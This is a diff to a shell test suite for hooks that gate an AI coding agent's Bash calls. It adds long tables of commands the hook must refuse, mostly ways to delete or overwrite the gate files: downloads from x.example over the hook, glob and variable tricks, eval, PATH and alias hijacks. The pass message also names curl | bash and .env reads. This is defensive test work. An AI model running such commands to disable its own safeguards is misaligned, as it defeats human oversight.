@@ -7484,7 +7484,7 @@ sec "== 12g) a git commit is read the way the shell and git read it: the forms t
 # skipped by design, so only the §4.5 rows are refused there. `\x27` is a single quote, `\n` JSON's newline, @O@
 # another repository, @W@ this one.
 if [ "$UNITS" != 1 ]; then
-  skip scope "commit forms: the unit cases run in the source checkout (scope=install)" 30
+  skip scope "commit forms: the unit cases run in the source checkout (scope=install)" 31
 else
 _CF="$(mktemp -d)"; _CF="$(cd -P "$_CF" && pwd)"; _cfw="$_CF/w"; _cfo="$_CF/o"; _cfq="'"; _cf_badjson=""
 _cf_new(){ rm -rf "$_CF/w" "$_CF/o"
@@ -8302,8 +8302,7 @@ LJA='0/ask 0/allow @@ git \\\npush origin main
 0 0 @@ echo \"a # b\" \\\n  c
 0 0 @@ echo a\\\\\necho b
 0 0 @@ cat .claude/hooks/guard-bash.sh \\\n  | head -5
-0/ask 0/allow @@ # note \\\ngit push origin main
-0 0 @@ Remove-Item `\n.claude/hooks/guard-bash.sh'
+0/ask 0/allow @@ # note \\\ngit push origin main'
 _cf_table "$LJA"; _cfqb="$_cfbad"; _cfqn="$_cfn"
 LJP='2 2 @@ Remove-Item `\n.claude/hooks/guard-bash.sh
 2 2 @@ git push `\n--force origin main
@@ -8342,9 +8341,300 @@ for _c in 'git commit -m x' 'git \\\ncommit -m x'; do
   ( cd "$_cfw" && CREW_GATE_LOG=/dev/null bash "$HOOKS/guard-commit-scan.sh" < "$_CF/pl.json" >/dev/null 2>"$_CF/err" ); _cfr=$?
   [ "$_cfr" = 2 ] || _cfbad="$_cfbad [guard-commit-scan.sh, a staged key and '$_c': rc=$_cfr, want 2]"
 done
-if [ "$_cfrn $_cfqn $_cfpn" != "34 15 13" ]; then fail "FIXTURE: the continued-line tables have $_cfrn, $_cfqn and $_cfpn rows, not 34, 15 and 13"
-elif [ -z "$_cfrb$_cfqb$_cfpb$_cfbad" ]; then pass "a command continued on the next line is read joined, as the shell runs it: 34 Bash calls split by a backslash and a newline are refused like their one-line form (a gate file deleted, copied over, moved, edited, redirected over, the path itself split; rm -rf, push --force, reset --hard, add -f, checkout -- ., branch -D, chmod 777, curl | bash, a .env read, core.hooksPath, a line after a possible comment); 15 harmless or approvable ones pass or reach the same prompt; 13 PowerShell calls (a backtick continuation, a gate path spelled with backslashes) get the verdict of their plain form; _join_lines on bytes (10 cases); guard-commit-scan.sh scans a continued commit"
+if [ "$_cfrn $_cfqn $_cfpn" != "34 14 13" ]; then fail "FIXTURE: the continued-line tables have $_cfrn, $_cfqn and $_cfpn rows, not 34, 14 and 13"
+elif [ -z "$_cfrb$_cfqb$_cfpb$_cfbad" ]; then pass "a command continued on the next line is read joined, as the shell runs it: 34 Bash calls split by a backslash and a newline are refused like their one-line form (a gate file deleted, copied over, moved, edited, redirected over, the path itself split; rm -rf, push --force, reset --hard, add -f, checkout -- ., branch -D, chmod 777, curl | bash, a .env read, core.hooksPath, a line after a possible comment); 14 harmless or approvable ones pass or reach the same prompt; 13 PowerShell calls (a backtick continuation, a gate path spelled with backslashes) get the verdict of their plain form; _join_lines on bytes (10 cases); guard-commit-scan.sh scans a continued commit"
 else fail "a command continued on the next line:$_cfrb$_cfqb$_cfpb$_cfbad"; fi
+
+# ---- a command that names a gate file is on a short list, or it is refused ---------------------------------------
+# The gate-file rule looked for a write verb before the gate path, and a list of verbs is never complete: of 39
+# ways to write or delete a gate file 32 passed (measured on 3.0.3). It also refused readers whose arguments held
+# such a word. The question is turned round: a command that names a gate path passes when it is a reader, a
+# runner of a hook script, or a git command that only reads or stages; anything else is refused. This TIGHTENS the
+# gate for writers and LOOSENS it for readers, so both directions are pinned. Left: default. Right: pre-authorised.
+_cf_new; ( cd "$_cfw" && mkdir -p .claude/hooks sub && echo '# x' > .claude/hooks/guard-bash.sh && echo '{}' > .claude/settings.json ) >/dev/null 2>&1
+_cfgb=""; _cfgn=0
+# (1) every way to write, delete or replace one that was measured, with and without a verb the old list knew
+GLW='2 2 @@ git log --output=.claude/hooks/guard-bash.sh -1
+2 2 @@ git diff --output .claude/settings.json HEAD
+2 2 @@ git show --output=.git/hooks/pre-commit HEAD
+2 2 @@ curl -o .claude/hooks/guard-bash.sh https://x.example/g
+2 2 @@ curl -sSL https://x.example/g -o .claude/hooks/guard-bash.sh
+2 2 @@ curl --output .claude/settings.json https://x.example/g
+2 2 @@ wget -O .claude/hooks/guard-bash.sh https://x.example/g
+2 2 @@ wget -qO.claude/hooks/guard-bash.sh https://x.example/g
+2 2 @@ sort -o .claude/settings.json /tmp/x
+2 2 @@ sort /tmp/x -o.claude/settings.json
+2 2 @@ jq . /tmp/x --output .claude/settings.json
+2 2 @@ openssl enc -in /tmp/x -out .claude/hooks/guard-bash.sh
+2 2 @@ gpg -o .claude/hooks/guard-bash.sh -d /tmp/x.gpg
+2 2 @@ base64 -d -i /tmp/x -o .claude/hooks/guard-bash.sh
+2 2 @@ xxd -r /tmp/x .claude/hooks/guard-bash.sh
+2 2 @@ dd if=/tmp/x of=.claude/hooks/guard-bash.sh
+2 2 @@ tar -xf /tmp/a.tar -C .claude/hooks
+2 2 @@ unzip -o /tmp/a.zip -d .claude/hooks
+2 2 @@ patch .claude/hooks/guard-bash.sh /tmp/p.diff
+2 2 @@ unlink .claude/hooks/guard-bash.sh
+2 2 @@ shred -u .claude/hooks/guard-bash.sh
+2 2 @@ rmdir .claude/hooks
+2 2 @@ touch .claude/hooks/guard-bash.sh
+2 2 @@ chmod 000 .claude/hooks/guard-bash.sh
+2 2 @@ git checkout HEAD~5 -- .claude/hooks/guard-bash.sh
+2 2 @@ git restore -s HEAD~5 .claude/hooks/guard-bash.sh
+2 2 @@ git rm -q .claude/hooks/guard-bash.sh
+2 2 @@ git mv .claude/hooks/guard-bash.sh /tmp/x
+2 2 @@ git update-index --assume-unchanged .claude/hooks/guard-bash.sh
+2 2 @@ awk -i inplace 1 .claude/hooks/guard-bash.sh
+2 2 @@ vim -c wq .claude/hooks/guard-bash.sh
+2 2 @@ tee .claude/hooks/guard-bash.sh
+2 2 @@ sqlite3 x.db \".output .claude/hooks/guard-bash.sh\"
+2 2 @@ gzip -c /tmp/x > .claude/hooks/guard-bash.sh
+2 2 @@ script -q .claude/hooks/guard-bash.sh ls
+2 2 @@ split /tmp/x .claude/hooks/guard-bash.sh
+2 2 @@ find .claude/hooks -name guard-bash.sh -delete
+2 2 @@ find .claude/hooks -type f -exec rm {} +
+2 2 @@ rsync -a /tmp/h/ .claude/hooks/
+2 2 @@ sort -o /tmp/out .claude/settings.json
+2 2 @@ tar -cf /tmp/h.tar .claude/hooks
+2 2 @@ chmod -x .claude/hooks/pre-commit
+2 2 @@ git config --file .git/config alias.x \"!rm\"
+2 2 @@ node -e writeFileSync(.claude/hooks/x)
+2 2 @@ .claude/hooks/x'
+_cf_table "$GLW"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+# (2) the path hidden: a glob, a variable, a loop, a cd, the parent directory, quoting inside the name, a
+#     substitution, xargs, a shell or eval that takes the command as text, a word that changes what `cat` runs
+GLH='2 2 @@ rm .claude/hoo*/guard*
+2 2 @@ rm .cl*/hooks/guard-bash.sh
+2 2 @@ rm .claude/*/guard-bash.sh
+2 2 @@ rm .claud?/hooks/guard-bash.sh
+2 2 @@ rm .{claude,x}/hooks/guard-bash.sh
+2 2 @@ rm -rf .claude
+2 2 @@ mv .claude /tmp/x
+2 2 @@ mv .claude/ .claude.bak
+2 2 @@ D=.claude/hooks; rm $D/guard-bash.sh
+2 2 @@ D=.claude; rm \"$D/hooks/guard-bash.sh\"
+2 2 @@ for f in .claude/hooks/*; do rm \"$f\"; done
+2 2 @@ cd .claude/hooks && rm guard-bash.sh
+2 2 @@ cd .claude && rm hooks/guard-bash.sh
+2 2 @@ cd .git && rm hooks/pre-commit
+2 2 @@ cd sub && rm ../.claude/hooks/guard-bash.sh
+2 2 @@ rm ./sub/../.claude/hooks/guard-bash.sh
+2 2 @@ rm .clau\\de/hooks/guard-bash.sh
+2 2 @@ rm \".claude\"/hooks/guard-bash.sh
+2 2 @@ rm .claude/\x27hooks\x27/guard-bash.sh
+2 2 @@ rm .claude//hooks/./guard-bash.sh
+2 2 @@ ls .claude/hooks/* | xargs rm
+2 2 @@ echo .claude/hooks/guard-bash.sh | xargs rm
+2 2 @@ rm $(ls -d .claude/hooks/*)
+2 2 @@ rm `echo .claude/hooks/guard-bash.sh`
+2 2 @@ bash -c \"rm .claude/hooks/guard-bash.sh\"
+2 2 @@ bash -c \x27cat .claude/hooks/guard-bash.sh\x27
+2 2 @@ sh -c \"unlink .claude/hooks/guard-bash.sh\"
+2 2 @@ eval \"cat .claude/hooks/guard-bash.sh\"
+2 2 @@ eval rm .claude/hooks/guard-bash.sh
+2 2 @@ source .claude/hooks/guard-bash.sh
+2 2 @@ . .claude/hooks/guard-bash.sh
+2 2 @@ bash /tmp/evil.sh .claude/hooks/guard-bash.sh
+2 2 @@ bash -s .claude/hooks/guard-bash.sh
+2 2 @@ PATH=/tmp/evil:$PATH cat .claude/hooks/guard-bash.sh
+2 2 @@ PAGER=/tmp/evil git log -- .claude/hooks/guard-bash.sh
+2 2 @@ export PATH=/tmp/evil:$PATH; cat .claude/hooks/guard-bash.sh
+2 2 @@ alias cat=rm; cat .claude/hooks/guard-bash.sh
+2 2 @@ cat() { rm \"$@\"; }; cat .claude/hooks/guard-bash.sh
+2 2 @@ if rm .claude/hooks/guard-bash.sh; then echo x; fi
+2 2 @@ true && { rm .claude/hooks/guard-bash.sh; }
+2 2 @@ ( rm .claude/hooks/guard-bash.sh )
+2 2 @@ env rm .claude/hooks/guard-bash.sh
+2 2 @@ command rm .claude/hooks/guard-bash.sh
+2 2 @@ sudo cat .claude/hooks/guard-bash.sh
+2 2 @@ /tmp/evil/cat .claude/hooks/guard-bash.sh
+2 2 @@ ./tool .claude/settings.json
+2 2 @@ shellcheck .claude/hooks/guard-bash.sh
+2 2 @@ git -c core.pager=rm log -- .claude/hooks/guard-bash.sh
+2 2 @@ git stash push .claude/hooks/guard-bash.sh
+2 2 @@ git diff --outp=.claude/hooks/guard-bash.sh
+2 2 @@ python3 - <<\x27PY\x27\nopen(\x27.claude/hooks/guard-bash.sh\x27,\x27w\x27)\nPY
+2 2 @@ cat > /tmp/s.sh <<EOF\nrm .claude/hooks/guard-bash.sh\nEOF\nbash /tmp/s.sh; rm .claude/hooks/guard-bash.sh
+2 2 @@ printf \x27%s\\n\x27 .claude/hooks/guard-bash.sh | while read f; do rm \"$f\"; done
+2 2 @@ ls .claude/hooks | sed \x27s/^/rm /\x27 | sh
+2 2 @@ echo \"rm .claude/hooks/guard-bash.sh\" | bash
+2 2 @@ cd .claude/hooks && bash
+2 2 @@ sed --in-place s/a/b/ .claude/hooks/guard-bash.sh
+2 2 @@ D=.claude/hooks; sed -i.bak s/a/b/ $D/guard-bash.sh'
+_cf_table "$GLH"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+# (3) the rows of the old verb rule: the verb where it runs, behind sudo, in a later command, a redirection by a reader
+GLA='2 2 @@ rm .claude/hooks/guard-bash.sh
+2 2 @@ rm -f .claude/hooks/pre-commit
+2 2 @@ /bin/rm .claude/hooks/guard-bash.sh
+2 2 @@ mv .claude/hooks/guard-bash.sh /tmp/x
+2 2 @@ cp /tmp/x .claude/hooks/guard-bash.sh
+2 2 @@ tee .claude/settings.json
+2 2 @@ ln -sf /tmp/x .claude/hooks/pre-commit
+2 2 @@ install -m 755 /tmp/x .claude/hooks/guard-bash.sh
+2 2 @@ node -e 1 .claude/hooks/x
+2 2 @@ python3 /tmp/e.py .claude/settings.json
+2 2 @@ ed .claude/hooks/guard-bash.sh
+2 2 @@ ex .claude/DISCIPLINE.md
+2 2 @@ truncate -s 0 .claude/hooks/guard-bash.sh
+2 2 @@ git rm .claude/hooks/guard-bash.sh
+2 2 @@ sudo rm .claude/hooks/guard-bash.sh
+2 2 @@ ls && rm .claude/hooks/board.sh
+2 2 @@ grep -l x .claude/hooks/guard-bash.sh; rm .claude/hooks/guard-bash.sh
+2 2 @@ grep -n rm .claude/hooks/guard-bash.sh && rm .claude/hooks/guard-bash.sh
+2 2 @@ cat /tmp/x | tee .claude/hooks/guard-bash.sh
+2 2 @@ cat /tmp/x > .claude/hooks/guard-bash.sh
+2 2 @@ grep -n rm /tmp/x > .claude/hooks/guard-bash.sh
+2 2 @@ FOO=1 cat rm .claude/hooks/guard-bash.sh
+2 2 @@ sudo cat rm .claude/hooks/guard-bash.sh
+2 2 @@ xargs rm .claude/hooks/guard-bash.sh
+2 2 @@ find . -name x -exec rm .claude/hooks/guard-bash.sh
+2 2 @@ rg --pre rm x .claude/hooks/guard-bash.sh
+2 2 @@ rg --pre=rm x .claude/hooks/guard-bash.sh
+2 2 @@ cat $(rm .claude/hooks/guard-bash.sh)
+2 2 @@ cat `rm .claude/hooks/guard-bash.sh`
+2 2 @@ alias cat=eval; cat rm .claude/hooks/guard-bash.sh
+2 2 @@ hash -p /bin/sh cat; cat -c \"rm .claude/hooks/guard-bash.sh\"
+2 2 @@ function grep { \"$@\"; }; grep rm .claude/hooks/guard-bash.sh
+2 2 @@ PATH=/tmp/evil:$PATH; cat rm .claude/hooks/guard-bash.sh
+2 2 @@ awk /cp/ .claude/hooks/guard-bash.sh
+2 2 @@ rm\\ -f .claude/hooks/guard-bash.sh
+2 2 @@ cd /Users/ed/p && rm .claude/hooks/guard-bash.sh
+2 2 @@ /Users/ed/bin/rm .claude/hooks/guard-bash.sh
+2 2 @@ cat a <<EOF | tee .claude/hooks/x\nrm\nEOF
+2 2 @@ grep -n rm .claude/hooks/guard-bash.sh | xargs rm .claude/hooks/x
+2 2 @@ sed -i s/a/b/ .claude/hooks/guard-bash.sh
+2 2 @@ cat x\nrm .claude/hooks/guard-bash.sh
+2 2 @@ awk \x27/cp /\x27 .claude/hooks/guard-bash.sh
+2 2 @@ git grep -n rm -- .claude/hooks/guard-bash.sh
+2 2 @@ cat .claude/hooks/x; node /Users/ed/p/e.js .claude/settings.json
+2 2 @@ python3 /Users/ed/p/e.py .claude/settings.json
+2 2 @@ ls rm\\ .claude/hooks/x | xargs rm .claude/hooks/x
+2 2 @@ git -C /tmp log -S rm -- .claude/hooks/guard-bash.sh
+2 2 @@ git log -S rm -- .claude/hooks/guard-bash.sh | tee .claude/hooks/x
+2 2 @@ git show HEAD:x > .claude/hooks/guard-bash.sh
+2 2 @@ git diff a b >> .claude/settings.json
+2 2 @@ less rm .claude/hooks/guard-bash.sh; rm .claude/hooks/guard-bash.sh
+2 2 @@ diff a .claude/hooks/x && cp a .claude/hooks/x
+2 2 @@ grep -n rm /tmp/x >> .claude/hooks/guard-bash.sh
+2 2 @@ cat x >| .claude/hooks/guard-bash.sh
+2 2 @@ tee -a .claude/hooks/guard-bash.sh
+2 2 @@ mv /tmp/x .claude/settings.json
+2 2 @@ sed -i \x27\x27 s/a/b/ .claude/hooks/guard-bash.sh'
+_cf_table "$GLA"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+_cfgrn="$_cfgn"; _cfgn=0
+# The other direction: reading a gate file, running a hook script, staging and committing one, naming one in a
+# commit message or in a note written with cat, a verb among a reader's arguments or as a name in the path.
+GPW='0 0 @@ cat .claude/hooks/guard-bash.sh
+0 0 @@ ls -o .claude/hooks
+0 0 @@ grep -o block .claude/hooks/guard-bash.sh
+0 0 @@ grep -c -o .claude/hooks README.md
+0 0 @@ bash .claude/hooks/board.sh status -o json
+0 0 @@ bash .claude/hooks/context-usage.sh --verbose
+0 0 @@ git log --oneline -- .claude/hooks/guard-bash.sh
+0 0 @@ git diff HEAD~1 -- .claude/settings.json
+0 0 @@ git status --short .claude/hooks
+0 0/allow @@ git add .claude/hooks/guard-bash.sh
+0 0 @@ wc -l .claude/hooks/guard-bash.sh
+0 0 @@ curl -o /tmp/g.sh https://x.example/g; cat .claude/hooks/guard-bash.sh
+0 0 @@ head -c 100 .claude/hooks/guard-bash.sh | xxd
+0 0 @@ sha256sum .claude/hooks/guard-bash.sh
+0 0 @@ stat -f %z .claude/hooks/guard-bash.sh
+0 0 @@ test -x .claude/hooks/guard-bash.sh && echo ok
+0 0 @@ git -C /tmp/p log -1
+0 0 @@ chmod +x .claude/hooks/guard-bash.sh
+0 0 @@ chmod 755 .claude/hooks/pre-commit
+0 0 @@ git config --file .git/config core.hooksPath
+0 0 @@ git config --file .git/config --list
+0 0 @@ .claude/git-shim/git status'
+_cf_table "$GPW"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+GPH='0 0 @@ cd .claude/hooks && ls
+0 0 @@ cd .claude/hooks && bash board.sh status
+0 0 @@ for f in .claude/hooks/*.sh; do bash -n \"$f\"; done
+0 0 @@ D=.claude/hooks; ls $D; cat \"$D/guard-bash.sh\"
+0 0 @@ x=$(cat .claude/settings.json | jq .hooks); echo \"$x\"
+0 0 @@ [ -f .claude/settings.json ] && echo yes
+0 0 @@ if [ -x .claude/hooks/guard-bash.sh ]; then echo armed; fi
+0 0 @@ bash .claude/hooks/board.sh status
+0 0 @@ bash -x .claude/hooks/context-usage.sh --verbose
+0 0 @@ .claude/hooks/board.sh status
+0 0 @@ /bin/cat .claude/hooks/guard-bash.sh
+0 0 @@ \"cat\" .claude/hooks/guard-bash.sh
+0 0 @@ sed -n \x271,20p\x27 .claude/hooks/guard-bash.sh
+0 0 @@ find .claude/hooks -name \x27*.sh\x27 -newer README.md
+0 0 @@ ls .claude
+0 0 @@ ls -la .claude/ | head
+0 0 @@ mkdir -p .claude/hooks
+0 0/allow @@ git add .claude/settings.json && git status --short
+0/ask 0/allow @@ git commit -m \"docs: say where .claude/hooks/guard-bash.sh is wired\"
+0/ask 0/allow @@ git commit -m \"$(cat <<\x27EOF\x27\nfix: the rule for .claude/hooks/guard-bash.sh\nEOF\n)\"
+0 0 @@ cat > /tmp/notes.md <<\x27EOF\x27\nThe gate is .claude/hooks/guard-bash.sh; do not rm it.\nEOF
+0 0 @@ echo \"see .claude/hooks/guard-bash.sh\" | head -1
+0 0 @@ grep -rn \"foo|bar\" .claude/hooks/guard-bash.sh
+0 0 @@ rm src/*.tmp .cache/*
+0 0 @@ ls *.sh .[a-z]*
+0 0 @@ rm -f /tmp/x; ls .claude/hooks
+0 0 @@ cat .claude/settings.json | while read l; do echo \"$l\"; done
+0 0 @@ ls .claude/hooks | head -3 | wc -l'
+_cf_table "$GPH"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+GPA='0 0 @@ grep -n rm .claude/hooks/guard-bash.sh
+0 0 @@ rg -w cp .claude/hooks/guard-bash.sh
+0 0 @@ cat /Users/ed/p/.claude/hooks/x
+0 0 @@ grep -c \x27tee \x27 .claude/settings.json
+0 0 @@ grep -rn \"python3\" .claude/hooks/
+0 0 @@ head -20 /opt/node/app/.claude/hooks/guard-bash.sh
+0 0 @@ tail -n 5 /home/install/.claude/settings.json
+0 0 @@ wc -l /Users/ed/p/.claude/hooks/pre-commit
+0 0 @@ ls -la /Users/ed/p/.claude/hooks
+0 0 @@ bash /Users/ed/p/.claude/hooks/board.sh status
+0 0 @@ bash /srv/node/app/.claude/hooks/context-usage.sh --verbose
+0 0 @@ grep -n mv .claude/hooks/guard-bash.sh | head -3
+0 0 @@ grep -n ln .claude/DISCIPLINE.md; echo done
+0 0 @@ grep -n rm .claude/hooks/guard-bash.sh > /tmp/out.txt
+0 0 @@ ls && grep -n ed .git/hooks/pre-commit
+0 0 @@ fgrep -n install ~/.gitconfig
+0 0 @@ egrep -n \x27rm|mv\x27 .claude/git-shim/git
+0 0 @@ (cat rm .claude/hooks/guard-bash.sh)
+0 0 @@ cat \"unterminated rm .claude/hooks/guard-bash.sh
+0 0 @@ sed -n /rm/p .claude/hooks/guard-bash.sh
+0 0 @@ less rm .claude/hooks/guard-bash.sh
+0 0 @@ \"cat\" rm .claude/hooks/guard-bash.sh
+0 0 @@ \\cat rm .claude/hooks/guard-bash.sh
+0 0 @@ /bin/cat rm .claude/hooks/guard-bash.sh
+0 0 @@ sed -n \x27/rm /p\x27 .claude/hooks/guard-bash.sh
+0 0 @@ cat C:\\Users\\ed\\p\\.claude\\hooks\\guard-bash.sh
+0 0 @@ bash C:/Users/ed/p/.claude/hooks/board.sh status
+0 0 @@ less /Users/ed/p/.claude/hooks/guard-bash.sh
+0 0 @@ diff /tmp/ed/guard-bash.sh .claude/hooks/guard-bash.sh
+0 0 @@ diff -u cp .claude/hooks/guard-bash.sh
+0 0 @@ git show HEAD:kit/hooks/rm .claude/hooks/guard-bash.sh
+0 0 @@ git log --oneline -S rm -- .claude/hooks/guard-bash.sh
+0 0 @@ git diff next -- cp .claude/settings.json
+0 0 @@ git --no-pager log -S tee -- .claude/hooks/guard-bash.sh
+0 0 @@ git log -G \"rm -f\" -- .claude/hooks/guard-bash.sh
+0 0 @@ git \"log\" -S rm -- .claude/hooks/guard-bash.sh'
+_cf_table "$GPA"; _cfgb="$_cfgb$_cfbad"; _cfgn=$((_cfgn+_cfn))
+_cfgpn="$_cfgn"
+# A call that already STANDS in a gate directory reaches the files by their short names: every command of it
+# answers to the list. In any other directory the same commands are free.
+_cfgc=""
+for _r in '.claude/hooks|rm guard-bash.sh|2' '.claude|rm hooks/guard-bash.sh|2' '.git|rm hooks/pre-commit|2' '.git/hooks|npm test|2' '.claude/hooks|ls|0' '.claude/hooks|bash board.sh status|0' 'sub|rm guard-bash.sh|0' 'sub|npm test|0'; do
+  _d="${_r%%|*}"; _c="${_r#*|}"; _w="${_c##*|}"; _c="${_c%|*}"
+  printf '{"session_id":"s","cwd":"%s/%s","permission_mode":"default","tool_name":"Bash","tool_input":{"command":"%s"}}' "$_cfw" "$_d" "$_c" > "$_CF/pl.json"
+  ( cd "$_cfw" && CREW_GATE_LOG=/dev/null bash "$HOOKS/guard-bash.sh" < "$_CF/pl.json" >/dev/null 2>&1 ); _cfr=$?
+  [ "$_cfr" = "$_w" ] || _cfgc="$_cfgc [in $_d: $_c → $_cfr, want $_w]"
+done
+_cfgb="$_cfgb$_cfgc"
+# PowerShell keeps the verb rule (a reader's argument is still counted there); a verb that is a name in a path is not.
+_cf_table '2 2 @@ Remove-Item .claude/hooks/guard-bash.sh
+2 2 @@ grep -n rm .claude/hooks/guard-bash.sh
+2 2 @@ cat rm .claude/hooks/x
+2 2 @@ Remove-Item C:\\Users\\ed\\p\\.claude\\hooks\\x
+2 2 @@ Get-Content C:\\Users\\ed\\p\\.claude\\hooks\\x | Set-Content .claude\\hooks\\y
+0 0 @@ Get-Content C:\\Users\\ed\\p\\.claude\\hooks\\x
+0 0 @@ bash C:\\Users\\node\\p\\.claude\\hooks\\board.sh status
+2 2 @@ node C:\\Users\\ed\\p\\.claude\\hooks\\x.js' PowerShell
+if [ "$_cfgrn $_cfgpn $_cfn" != "160 86 8" ]; then fail "FIXTURE: the gate-file tables have $_cfgrn, $_cfgpn and $_cfn rows, not 160, 86 and 8"
+elif [ -z "$_cfgb$_cfbad" ]; then pass "a command that names a gate file is a reader, a runner of a hook script or a reading git command, or it is refused: 160 calls refused (a write by option or by a program the old verb list did not know: curl -o, wget -O, sort -o, git --output, tar -C, unzip -d, unlink, shred, touch, patch, an editor, find -delete, git checkout / restore of the file; the path hidden behind a glob, a variable, a loop, a cd, the parent directory, quoting, a substitution, xargs; bash -c, eval, source; a changed PATH, an alias, a function; an interpreter fed a here-document), 86 pass or reach the commit prompt (grep -n rm, cat, head, less, diff, git log / diff / show / add, bash <hook script>, a commit message or a note that names one, a folder called ed or node), 8 calls from inside .claude, .claude/hooks, .git and .git/hooks answer to the list as a whole and from any other folder do not, 8 PowerShell calls keep the verb rule (254 rows)"
+else fail "the gate-file list:$_cfgb$_cfbad"; fi
 
 # ---- a match on the command has no pipe, and a grep that could not run stops the call ----------------------------
 # The rules that grep the command fed it through a pipe, under pipefail. `grep -q` leaves at its first match, so with
